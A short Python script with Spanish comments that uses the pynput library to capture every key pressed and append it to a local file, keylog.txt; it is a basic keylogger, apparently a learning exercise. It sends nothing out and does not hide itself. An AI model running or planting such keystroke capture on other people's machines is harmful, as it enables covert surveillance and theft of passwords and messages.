from pynput import keyboard

# codigo ASCII


log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f: # a significa append
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [ {key} ] ")
            
with keyboard.Listener(on_press=on_press) as listener: 
    listener.join()
    
